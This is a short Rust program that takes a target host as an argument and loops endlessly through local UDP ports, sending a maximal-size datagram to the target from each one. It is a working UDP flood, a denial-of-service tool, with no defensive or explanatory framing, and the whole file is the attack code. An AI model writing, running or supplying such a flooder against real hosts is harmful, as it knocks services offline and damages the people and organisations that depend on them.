use std::env;
use std::io;
use tokio::net::UdpSocket;

#[tokio::main]
async fn main() -> io::Result<()> {
    let args: Vec<_> = env::args().collect();
    let host = args[1].to_string();

    let buf = [1; 65507];
    loop {
        for i in 1..65535 {
            println!("{}", i);
            let sock = UdpSocket::bind(format!("0.0.0.0:{}", i)).await;

            match sock {
                Err(_e) => continue,
                Ok(sock) => {
                    let _result = sock.send_to(&buf, &host).await;
                }
            }
        }
    }
}
